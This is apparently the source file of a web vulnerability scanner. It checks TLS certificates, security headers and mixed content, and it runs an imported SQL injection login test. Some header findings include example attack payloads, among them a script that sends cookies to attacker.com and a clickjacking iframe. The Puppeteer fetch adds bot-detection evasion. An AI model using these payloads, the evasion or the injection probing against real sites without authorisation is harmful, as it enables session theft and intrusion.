// backend/src/utils/scan.js
import axios from "axios";
import tls from "tls";
import { URL } from "url";
import { generateAiRecommendations } from "./ai.js"; // optional - keep if you have ai.js
import puppeteer from "puppeteer";
import { testLoginSQLInjection, generateSQLInjectionReport } from "./sqlInjectionTest.js";

/**
 * Simple exponential backoff retry wrapper.
 * fn should be an async function.
 */
async function retryWithBackoff(fn, { retries = 3, baseDelay = 500 } = {}) {
  let attempt = 0;
  while (true) {
    try {
      return await fn();
    } catch (err) {
      attempt++;
      if (attempt > retries) throw err;
      const wait = baseDelay * Math.pow(2, attempt - 1) + Math.floor(Math.random() * 100);
      await new Promise((r) => setTimeout(r, wait));
    }
  }
}

/**
 * TLS / certificate check using tls.connect
 */
async function getCertificateInfo(hostname, port = 443, timeout = 5000) {
  return new Promise((resolve) => {
    const socket = tls.connect(
      {
        host: hostname,
        port,
        servername: hostname,
        rejectUnauthorized: false,
        ALPNProtocols: ["http/1.1"],
      },
      () => {
        const cert = socket.getPeerCertificate(true);
        if (!cert || Object.keys(cert).length === 0) {
          socket.end();
          return resolve({ ok: false, error: "No certificate" });
        }
        const now = new Date();
        const validFrom = new Date(cert.valid_from);
        const validTo = new Date(cert.valid_to);
        const expiresInDays = Math.ceil((validTo - now) / (1000 * 60 * 60 * 24));
        resolve({
          ok: true,
          subject: cert.subject,
          issuer: cert.issuer,
          validFrom: validFrom.toISOString(),
          validTo: validTo.toISOString(),
          expiresInDays,
          raw: {
            valid_from: cert.valid_from,
            valid_to: cert.valid_to,
          },
        });
        socket.end();
      }
    );

    socket.setTimeout(timeout, () => {
      socket.destroy();
      resolve({ ok: false, error: "TLS lookup timed out" });
    });

    socket.on("error", (err) => {
      resolve({ ok: false, error: String(err) });
    });
  });
}

/**
 * Header security checks
 */
function runHeaderChecks(headers) {
  const findings = [];

  const h = {};
  // normalize header names
  for (const [k, v] of Object.entries(headers || {})) {
    h[k.toLowerCase()] = typeof v === "string" ? v : Array.isArray(v) ? v.join("; ") : String(v);
  }

  if (!h["content-security-policy"]) {
    findings.push({
      id: `hdr-01`,
      title: "Missing Content-Security-Policy",
      severity: "High",
      owasp: "A05:2021",
      description: "No CSP header found — increases risk of XSS and data injection.",
      remediation:
        "Add a restrictive Content-Security-Policy. Example: Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.example.com; object-src 'none';",
      exploit: {
        loophole: "Without CSP, the browser has no restrictions on what scripts can execute or where resources can be loaded from.",
        attackVector: "An attacker can inject malicious scripts through XSS vulnerabilities, and the browser will execute them without any policy restrictions.",
        examplePayload: "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>\n\nThis payload steals cookies and sends them to an attacker-controlled server."
      }
    });
  } else {
    // quick detection of very permissive CSP
    if (h["content-security-policy"].includes("*") || h["content-security-policy"].includes("unsafe-inline")) {
      findings.push({
        id: `hdr-01b`,
        title: "Permissive Content-Security-Policy",
        severity: "Medium",
        owasp: "A05:2021",
        description: "CSP appears permissive (unsafe-inline or wildcard), lowering effectiveness.",
        remediation: "Tighten CSP: avoid 'unsafe-inline' and wildcards; specify trusted sources.",
      });
    }
  }

  if (!h["strict-transport-security"]) {
    findings.push({
      id: `hdr-02`,
      title: "Missing HSTS header",
      severity: "Medium",
      owasp: "A06:2021",
      description: "Strict-Transport-Security not set; site may allow insecure connections.",
      remediation: "Add Strict-Transport-Security: max-age=63072000; includeSubDomains; preload",
      exploit: {
        loophole: "Without HSTS, browsers may initially connect via HTTP before upgrading to HTTPS, creating a window for man-in-the-middle attacks.",
        attackVector: "An attacker on the same network can intercept the initial HTTP request and downgrade the connection or steal session tokens.",
        examplePayload: "User types 'example.com' → Browser tries http://example.com first → Attacker intercepts and serves fake login page → Credentials stolen"
      }
    });
  }

  if (!h["x-frame-options"] && !h["content-security-policy"]?.includes("frame-ancestors")) {
    findings.push({
      id: `hdr-03`,
      title: "Missing clickjacking protection",
      severity: "Medium",
      owasp: "A05:2021",
      description: "No X-Frame-Options or CSP frame-ancestors; page may be embedded in frames.",
      remediation: "Add X-Frame-Options: DENY or set CSP frame-ancestors 'none'.",
      exploit: {
        loophole: "The application can be embedded in an iframe on any malicious website without restrictions.",
        attackVector: "An attacker creates a malicious page with your site in an invisible iframe, overlaying fake UI elements to trick users into performing actions.",
        examplePayload: "<iframe src='https://yoursite.com/transfer' style='opacity:0'></iframe>\n<button style='position:absolute;top:100px'>Click to win!</button>\n\nUser clicks 'win' button but actually clicks 'transfer money' in the hidden iframe."
      }
    });
  }

  if (!h["x-content-type-options"]) {
    findings.push({
      id: `hdr-04`,
      title: "Missing X-Content-Type-Options",
      severity: "Low",
      owasp: "A06:2021",
      description: "No X-Content-Type-Options header; some MIME sniffing risk remains.",
      remediation: "Add X-Content-Type-Options: nosniff",
      exploit: {
        loophole: "Browsers may MIME-sniff content and execute files differently than intended based on their content rather than declared Content-Type.",
        attackVector: "An attacker uploads a file disguised as an image but containing JavaScript. The browser sniffs it and executes it as a script.",
        examplePayload: "Upload 'image.jpg' containing: GIF89a<script>alert('XSS')</script>\n\nBrowser detects HTML/JS and executes it despite .jpg extension."
      }
    });
  }

  if (!h["referrer-policy"]) {
    findings.push({
      id: `hdr-05`,
      title: "Missing Referrer-Policy",
      severity: "Low",
      description: "No Referrer-Policy header detected.",
      remediation: "Add Referrer-Policy: no-referrer-when-downgrade or strict-origin-when-cross-origin",
    });
  }

  if (!h["permissions-policy"] && !h["feature-policy"]) {
    findings.push({
      id: `hdr-06`,
      title: "Missing Permissions-Policy (Feature-Policy)",
      severity: "Low",
      description: "No Permissions-Policy found — site may expose unnecessary features.",
      remediation: "Add Permissions-Policy header to restrict camera/gyroscope/usb etc. to trusted origins.",
    });
  }

  return { findings, normalized: h };
}

/**
 * Puppeteer fallback fetch (loads JS)
 */
async function puppeteerFetch(url, timeout = 20000) {
  const browser = await puppeteer.launch({
    headless: "new", // 'new' when available, else true
    args: [
      "--no-sandbox",
      "--disable-setuid-sandbox",
      "--disable-dev-shm-usage",
      "--disable-infobars",
      "--window-size=1280,800",
    ],
  });

  try {
    const page = await browser.newPage();

    // set a realistic UA (rotate here if you want)
    await page.setUserAgent(
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    );
    await page.setViewport({ width: 1280, height: 800 });

    // simple stealth measures
    await page.evaluateOnNewDocument(() => {
      // remove webdriver
      Object.defineProperty(navigator, "webdriver", { get: () => false });
      // mock chrome object
      window.chrome = { runtime: {} };
      // languages
      Object.defineProperty(navigator, "languages", { get: () => ["en-US", "en"] });
      // permissions
      const originalQuery = window.navigator.permissions.query;
      window.navigator.permissions.query = (parameters) =>
        parameters.name === "notifications"
          ? Promise.resolve({ state: Notification.permission })
          : originalQuery(parameters);
    });

    // intercept response to collect headers
    let collectedHeaders = {};
    page.on("response", (resp) => {
      try {
        if (resp.url() === url) {
          collectedHeaders = resp.headers();
        }
      } catch (e) {}
    });

    await page.goto(url, { waitUntil: "domcontentloaded", timeout });

    // wait a short time for JS to run
    await page.waitForTimeout(1200);

    const html = await page.content();

    // optionally snapshot cookies, status, final URL
    const status = (await page.mainFrame().executionContext().evaluate(() => document?.readyState)) || "unknown";

    const finalUrl = page.url();

    await page.close();
    await browser.close();

    return {
      html,
      headers: collectedHeaders,
      finalUrl,
      status,
    };
  } catch (err) {
    try {
      await browser.close();
    } catch (e) {}
    throw err;
  }
}

/**
 * The main exported function that performs a scan of a target URL.
 */
export async function scanTarget(rawUrl) {
  // Normalize the url
  let url;
  try {
    url = new URL(rawUrl);
    if (!url.protocol || !["http:", "https:"].includes(url.protocol)) {
      throw new Error("Invalid protocol");
    }
  } catch (err) {
    throw new Error("Invalid URL provided");
  }

  // results container
  const vulnerabilities = [];
  let headers = {};
  let ai = null;
  let tlsInfo = null;

  // 1) TLS check (if https)
  if (url.protocol === "https:") {
    try {
      const certInfo = await getCertificateInfo(url.hostname, url.port || 443);
      tlsInfo = certInfo;
      if (!certInfo.ok) {
        vulnerabilities.push({
          id: "tls-01",
          title: "TLS/SSL problem",
          severity: "High",
          description: `TLS check failed: ${certInfo.error || "unknown"}`,
          remediation: "Ensure a valid certificate is installed and accessible.",
        });
      } else if (certInfo.expiresInDays <= 14) {
        vulnerabilities.push({
          id: "tls-02",
          title: "Certificate expires soon",
          severity: "Medium",
          description: `Certificate expires in ${certInfo.expiresInDays} days.`,
          remediation: "Renew the SSL/TLS certificate before expiry.",
        });
      }
    } catch (err) {
      // swallow, push an info
      tlsInfo = { ok: false, error: String(err) };
    }
  }

  // helper to try axios then fallback to puppeteer
  const fetcher = async () => {
    // try axios first
    try {
      const resp = await axios.get(url.toString(), {
        timeout: 12_000,
        maxRedirects: 5,
        headers: {
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        },
        validateStatus: () => true,
      });

      headers = resp.headers || {};
      // if content-type is HTML and status is 200 - good result
      const ct = (headers["content-type"] || "").toLowerCase();
      if (resp.status >= 400 || !ct.includes("text/html")) {
        // fallback to puppeteer for pages requiring JS or returning non-HTML
        throw new Error(`Axios returned status ${resp.status} or non-HTML content`);
      }

      return { source: "axios", html: resp.data, headers, finalUrl: resp.request?.res?.responseUrl || url.toString() };
    } catch (errAxios) {
      // fallback to puppeteer
      const pu = await puppeteerFetch(url.toString(), 25000);
      headers = pu.headers || headers;
      return { source: "puppeteer", html: pu.html, headers, finalUrl: pu.finalUrl || url.toString() };
    }
  };

  // Execute with retry/backoff
  let fetchResult;
  try {
    fetchResult = await retryWithBackoff(fetcher, { retries: 2, baseDelay: 600 });
  } catch (err) {
    throw new Error("Target is unreachable or blocked.");
  }

  // header checks
  const headerCheckResult = runHeaderChecks(headers);
  vulnerabilities.push(...headerCheckResult.findings);

  // some basic automated findings based on header content
  // detect server info leakage
  if (headers.server && headers.server.length > 0) {
    vulnerabilities.push({
      id: "hdr-XX-server",
      title: "Server header present",
      severity: "Low",
      description: `Server header discloses server info: ${headers.server}`,
      remediation: "Consider removing or obfuscating the Server header.",
    });
  }

  // X-Powered-By
  if (headers["x-powered-by"]) {
    vulnerabilities.push({
      id: "hdr-XX-xpb",
      title: "X-Powered-By header present",
      severity: "Low",
      description: `X-Powered-By header: ${headers["x-powered-by"]}`,
      remediation: "Remove X-Powered-By header to avoid disclosing framework info.",
    });
  }

  // simple mixed-content check (if the page uses HTTP resources)
  try {
    const htmlLower = (fetchResult.html || "").toLowerCase();
    if (htmlLower.includes('src="http:') || htmlLower.includes("src=http:") || htmlLower.includes("href=\"http:")) {
      vulnerabilities.push({
        id: "misc-01",
        title: "Mixed content detected",
        severity: "Medium",
        description: "Page includes HTTP resources while served over HTTPS (mixed content).",
        remediation: "Serve all resources (scripts, images, CSS) over HTTPS.",
      });
    }
  } catch (e) {}

  // SQL Injection testing (for authorized penetration testing only)
  console.log("🔍 Testing for SQL injection vulnerabilities...");
  try {
    const sqlInjectionResults = await testLoginSQLInjection(url.toString());
    if (sqlInjectionResults.vulnerable) {
      const sqlReport = generateSQLInjectionReport(sqlInjectionResults);
      if (sqlReport) {
        vulnerabilities.push(sqlReport);
        console.log("⚠️  SQL Injection vulnerability detected!");
      }
    }
  } catch (sqlErr) {
    console.log("SQL injection test failed:", sqlErr.message);
  }

  // AI recommendations: try to call external function if available
  try {
    if (typeof generateAiRecommendations === "function") {
      try {
        ai = await generateAiRecommendations({
          target: url.toString(),
          headers,
          findings: vulnerabilities,
        });
      } catch (aiErr) {
        ai = { error: "AI generation failed", info: String(aiErr) };
      }
    }
  } catch (e) {
    // ignore missing ai module
  }

  return {
    target: url.toString(),
    vulnerabilities,
    headers,
    tls: tlsInfo,
    fetch: { source: fetchResult.source, finalUrl: fetchResult.finalUrl },
    ai,
    generatedAt: new Date().toISOString(),
  };
}
